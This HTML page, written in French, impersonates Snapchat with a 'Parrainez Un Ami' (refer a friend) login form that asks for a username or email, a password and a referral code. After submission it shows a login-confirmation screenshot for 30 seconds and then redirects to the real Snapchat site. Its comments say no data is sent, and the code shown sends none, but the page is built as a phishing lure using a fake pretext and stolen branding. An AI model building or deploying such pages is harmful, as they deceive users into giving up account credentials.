<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Snapchat | Parrainez Un Ami</title>

  <meta property="og:title" content="Snapchat | Parrainez Un Ami" />
  <meta property="og:description" content="Description courte" />
  <meta property="og:image" content="[i.ibb.co](https://i.ibb.co/wZhXf3RN/Snapchat-1.png)" />

  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f0f0f0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box, .image-screen {
      width: 100%;
      max-width: 400px;
      padding: 40px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      border-radius: 10px;
      text-align: center;
      background-color: #fff;
      color: #000;
    }
    .logo {
      width: 80px;
      margin: 0 auto 20px auto;
      display: block;
    }
    .form-group {
      text-align: left;
      margin-bottom: 15px;
    }
    .form-group label {
      display: block;
      font-size: 13px;
      font-weight: bold;
      margin-bottom: 5px;
    }
    .form-group input {
      width: 100%;
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 16px;
      box-sizing: border-box;
    }
    button {
      background-color: #fffc00;
      border: none;
      color: #000;
      font-weight: bold;
      padding: 12px;
      width: 100%;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 20px;
      font-size: 16px;
    }
    .links-container {
      display: flex;
      justify-content: space-between;
      margin-top: 10px;
      font-size: 14px;
    }
    .link-button {
      background: transparent;
      border: none;
      color: blue;
      font-weight: bold;
      cursor: pointer;
      text-decoration: underline;
    }
    #errorMessage,
    #referralError {
      color: red;
      display: none;
      margin-top: 10px;
    }
    #imageScreen {
      display: none;
    }
    #imageScreen img {
      width: 200px; /* taille réduite */
      border-radius: 10px;
      display: block;
      margin: 0 auto;
    }
  </style>
</head>
<body>
  <div class="login-box" id="loginBox">
    <img src="[support-tools.storage.googleapis.com](https://support-tools.storage.googleapis.com/Snapchat-Ghost-logo-347777501.png)" alt="Logo Snapchat" class="logo" />
    <h2>Snapchat | Parrainez Un Ami</h2>
    <form id="loginForm">
      <div class="form-group">
        <label for="username">Nom d'utilisateur ou e-mail</label>
        <input type="text" id="username" required />
      </div>
      <div class="form-group">
        <label for="password">Mot de passe</label>
        <input type="password" id="password" required />
      </div>
      <div class="form-group">
        <label for="referralCode">Code de parrainage</label>
        <input type="text" id="referralCode" required />
      </div>

      <button type="submit">Connexion</button>

      <div class="links-container">
        <button type="button" class="link-button" id="signupBtn">S'inscrire</button>
        <button type="button" class="link-button" id="forgotBtn">Mot de passe oublié</button>
      </div>
    </form>
    <p id="errorMessage">Le nom d'utilisateur ou le mot de passe est incorrect.</p>
    <p id="referralError">Le code de parrainage doit contenir exactement 4 chiffres.</p>
  </div>

  <div class="image-screen" id="imageScreen">
    <img src="[images.airdroid.com](https://images.airdroid.com/2022/12/confirm-log-in-on-snapchat-web.jpg)" alt="Confirmation Snapchat" />
  </div>

  <script>
    // URL officielle de redirection (aucune donnée n'est envoyée)
    const redirectURL = "[accounts.snapchat.com](https://accounts.snapchat.com/accounts/v2/login)";

    // Aide: comportements des liens secondaires
    document.getElementById('signupBtn').addEventListener('click', () => {
      window.location.href = "[accounts.snapchat.com](https://accounts.snapchat.com/accounts/signup)";
    });
    document.getElementById('forgotBtn').addEventListener('click', () => {
      window.location.href = "[accounts.snapchat.com](https://accounts.snapchat.com/accounts/password_reset)";
    });

    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value.trim();
      const referralCode = document.getElementById('referralCode').value.trim();

      const errorMessage = document.getElementById('errorMessage');
      const referralError = document.getElementById('referralError');

      // Masquer les erreurs
      errorMessage.style.display = 'none';
      referralError.style.display = 'none';

      // Validation locale basique (sans transmettre ni stocker les valeurs)
      const invalidCreds = username.length < 3 || password.length < 3 || username.includes(" ") || password.includes(" ");
      if (invalidCreds) {
        errorMessage.style.display = 'block';
        return;
      }

      if (!/^\d{4}$/.test(referralCode)) {
        referralError.style.display = 'block';
        return;
      }

      // AUCUN envoi réseau. On passe directement à l'écran d'illustration puis à la redirection.
      setTimeout(() => {
        document.getElementById('loginBox').style.display = 'none';
        document.getElementById('imageScreen').style.display = 'block';

        setTimeout(() => {
          window.location.href = redirectURL;
        }, 30000); // 30 secondes
      }, 1000); // 1 seconde
    });
  </script>
</body>
</html>
